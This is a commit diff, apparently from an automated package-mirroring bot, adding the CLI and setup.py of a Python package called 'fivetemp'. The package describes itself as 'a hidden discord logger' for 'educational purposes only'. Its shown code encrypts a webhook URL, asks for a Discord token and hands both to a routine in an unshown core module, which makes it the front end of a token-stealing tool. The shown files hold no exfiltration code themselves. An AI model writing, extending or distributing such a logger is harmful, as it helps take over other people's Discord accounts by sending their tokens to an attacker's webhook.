548426ccf8ffc5f165e75d794bf55470b5b1588f
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2024-09-16 05:04:34 +0000

    Add package fivetemp/1.0.4/fivetemp-1.0.4.tar.gz

---
+++ packages/fivetemp/fivetemp-1.0.4.tar.gz/fivetemp-1.0.4/five_temp/cli.py
@@ -0,0 +1,66 @@
+import argparse
+from .core import s
+from .encrypt import encrypt
+from rgbprint import gradient_print, Color
+
+credit = """
+555555555555555555TTTTTTTTTTTTTTTTTTTTTTT
+5::::::::::::::::5T:::::::::::::::::::::T
+5::::::::::::::::5T:::::::::::::::::::::T
+5:::::555555555555T:::::TT:::::::TT:::::T
+5:::::5           TTTTTT  T:::::T  TTTTTT
+5:::::5                   T:::::T        
+5:::::5555555555          T:::::T        
+5:::::::::::::::5         T:::::T        
+555555555555:::::5        T:::::T        
+            5:::::5       T:::::T        
+            5:::::5       T:::::T        
+5555555     5:::::5       T:::::T        
+5::::::55555::::::5     TT:::::::TT      
+ 55:::::::::::::55      T:::::::::T      
+   55:::::::::55        T:::::::::T      
+     555555555          TTTTTTTTTTT      
+FiveTemp Coded By Abzyms. Socials at
+Youtube: @abyzmzs
+Github: Abyzms-Amphetamine
+"""
+
+def create_webh(encrypted_webhook):
+    return f"""
+555555555555555555TTTTTTTTTTTTTTTTTTTTTTT
+5::::::::::::::::5T:::::::::::::::::::::T
+5::::::::::::::::5T:::::::::::::::::::::T
+5:::::555555555555T:::::TT:::::::TT:::::T
+5:::::5           TTTTTT  T:::::T  TTTTTT
+5:::::5                   T:::::T        
+5:::::5555555555          T:::::T        
+5:::::::::::::::5         T:::::T        
+555555555555:::::5        T:::::T        
+            5:::::5       T:::::T        
+            5:::::5       T:::::T        
+5555555     5:::::5       T:::::T        
+5::::::55555::::::5     TT:::::::TT      
+ 55:::::::::::::55      T:::::::::T      
+   55:::::::::55        T:::::::::T      
+     555555555          TTTTTTTTTTT  
+Encrypted Webhook Shown Below This Msg
+{encrypted_webhook}
+"""
+
+def main():
+    parser = argparse.ArgumentParser(description='FiveTemp CLI')
+    parser.add_argument('-w', '--webhook', help='Encrypt Your Webhook.', type=str)
+    parser.add_argument('-c', '--credits', help='Show Credits.', action='store_true')
+    args = parser.parse_args()
+
+    if args.credits:
+        gradient_print(credit, start_color=Color.dark_magenta, end_color=Color.blue)
+    elif args.webhook:
+        encrypted_webhook = encrypt(args.webhook)
+        webh = create_webh(encrypted_webhook)
+        gradient_print(webh, start_color=Color.dark_magenta, end_color=Color.blue)
+        token = input("Enter your Discord Token: ")
+        s(encrypted_webhook, token)
+
+if __name__ == "__main__":
+    main()
---
+++ packages/fivetemp/fivetemp-1.0.4.tar.gz/fivetemp-1.0.4/setup.py
@@ -0,0 +1,28 @@
+from setuptools import setup, find_packages
+
+setup(
+    name='fivetemp',
+    version='1.0.4',
+    description='A hidden discord logger. Open for feature requests. discord.gg/zUjRjbJS educational purposes only. Fix Release 3',
+    long_description=open('README.md').read(),
+    long_description_content_type='text/markdown',
+    author='Abyzms',
+    author_email='abyzms0@gmail.com',
+    url='https://github.com/Abyzms-Amphetamine/fivetemp',
+    packages=find_packages(),
+    install_requires=[
+        'requests',
+        'rgbprint',
+        'pycryptodome',
+    ],
+    entry_points={
+        'console_scripts': [
+            '5t=five_temp.cli:main',
+        ],
+    },
+    classifiers=[
+        'Programming Language :: Python :: 3',
+        'License :: OSI Approved :: MIT License',
+        'Operating System :: OS Independent',
+    ],
+)
